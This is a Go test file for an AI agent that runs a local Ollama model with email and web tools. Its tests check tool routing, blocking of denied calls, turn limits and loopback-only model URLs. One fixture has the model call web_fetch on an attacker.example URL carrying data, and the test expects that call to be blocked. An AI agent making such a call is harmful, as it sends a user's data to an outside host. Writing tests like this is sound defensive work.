package agent

import (
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/miracaral/vaigil/internal/tools"
)

// fakeOllama is an httptest server that replays canned /api/chat replies
// and records each request. It runs inside the test process on loopback.
type fakeOllama struct {
	replies  []string // JSON bodies, in order
	requests []ollamaRequest
	status   int
}

func (f *fakeOllama) start(t *testing.T) *Ollama {
	t.Helper()
	srv := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		if r.URL.Path != "/api/chat" || r.Method != http.MethodPost {
			t.Errorf("unexpected request %s %s", r.Method, r.URL.Path)
		}
		var req ollamaRequest
		if err := json.NewDecoder(r.Body).Decode(&req); err != nil {
			t.Errorf("bad request body: %v", err)
		}
		f.requests = append(f.requests, req)
		if f.status != 0 {
			w.WriteHeader(f.status)
			w.Write([]byte(`{"error":"model not found"}`))
			return
		}
		reply := `{"message":{"role":"assistant","content":"done"}}`
		if len(f.replies) > 0 {
			reply, f.replies = f.replies[0], f.replies[1:]
		}
		w.Write([]byte(reply))
	}))
	t.Cleanup(srv.Close)
	o, err := NewOllama(srv.URL, "test-model")
	if err != nil {
		t.Fatal(err)
	}
	return o
}

func ollamaToolCallReply(name, args string) string {
	return `{"message":{"role":"assistant","content":"","tool_calls":[{"function":{"name":"` + name + `","arguments":` + args + `}}]}}`
}

// Every tool the model asks for goes through the Caller with its arguments,
// and the output goes back to the model as a "tool" message.
func TestOllamaToolCallsGoThroughCaller(t *testing.T) {
	f := &fakeOllama{replies: []string{
		ollamaToolCallReply("read_inbox", `{}`),
		ollamaToolCallReply("send_email", `{"to":"boss@company.example","body":"summary"}`),
	}}
	o := f.start(t)
	c := &recordingCaller{}
	o.Run(c, Task{Request: "Summarise my inbox."}, func(string) {})

	if len(c.calls) != 2 || c.calls[0] != "read_inbox" || c.calls[1] != "send_email" {
		t.Fatalf("calls = %v, want [read_inbox send_email]", c.calls)
	}
	if c.args[1]["to"] != "boss@company.example" || c.args[1]["body"] != "summary" {
		t.Fatalf("send_email args = %v", c.args[1])
	}
	if len(f.requests) != 3 {
		t.Fatalf("want 3 chat requests, got %d", len(f.requests))
	}
	first := f.requests[0]
	if first.Model != "test-model" || first.Stream || len(first.Tools) != 3 {
		t.Fatalf("first request: model %q, stream %v, %d tools", first.Model, first.Stream, len(first.Tools))
	}
	if sys := first.Messages[0]; sys.Role != "system" || !strings.Contains(sys.Content, tools.UserAddress) {
		t.Fatalf("system message does not give the user's address: %+v", sys)
	}
	last := f.requests[1].Messages[len(f.requests[1].Messages)-1]
	if last.Role != "tool" || last.ToolName != "read_inbox" || !strings.Contains(last.Content, "boss@company.example") {
		t.Fatalf("tool result message = %+v", last)
	}
}

// A call the control plane blocks goes back to the model as an error.
func TestOllamaBlockedCallIsReportedToModel(t *testing.T) {
	f := &fakeOllama{replies: []string{ollamaToolCallReply("web_fetch", `{"url":"https://attacker.example/?d=x"}`)}}
	o := f.start(t)
	o.Run(&recordingCaller{deny: map[string]bool{"web_fetch": true}}, Task{Request: "x"}, func(string) {})

	last := f.requests[1].Messages[len(f.requests[1].Messages)-1]
	if last.Role != "tool" || !strings.HasPrefix(last.Content, "error: ") {
		t.Fatalf("want an error tool message, got %+v", last)
	}
}

// A model that never stops calling tools is cut off.
func TestOllamaStopsAfterMaxTurns(t *testing.T) {
	f := &fakeOllama{}
	for range maxTurns + 5 {
		f.replies = append(f.replies, ollamaToolCallReply("read_inbox", `{}`))
	}
	o := f.start(t)
	o.Run(&recordingCaller{}, Task{Request: "x"}, func(string) {})
	if len(f.requests) != maxTurns {
		t.Fatalf("want %d chat requests, got %d", maxTurns, len(f.requests))
	}
}

// An Ollama error ends the run without calling any tool.
func TestOllamaErrorStopsRun(t *testing.T) {
	f := &fakeOllama{status: http.StatusNotFound}
	o := f.start(t)
	c := &recordingCaller{}
	var logged []string
	o.Run(c, Task{Request: "x"}, func(s string) { logged = append(logged, s) })
	if len(c.calls) != 0 || !strings.Contains(strings.Join(logged, "\n"), "model not found") {
		t.Fatalf("calls %v, log %v", c.calls, logged)
	}
}

// Only loopback addresses are accepted, so nothing leaves the machine.
func TestOllamaOnlyLoopback(t *testing.T) {
	for _, u := range []string{"http://localhost:11434", "http://127.0.0.1:11434", "http://[::1]:11434"} {
		if _, err := NewOllama(u, "m"); err != nil {
			t.Errorf("%s: want accepted, got %v", u, err)
		}
	}
	for _, u := range []string{"http://10.0.0.5:11434", "http://ollama.example.com", "http://localhost.attacker.example", "ftp://localhost", "localhost:11434"} {
		if _, err := NewOllama(u, "m"); err == nil {
			t.Errorf("%s: want rejected", u)
		}
	}
}
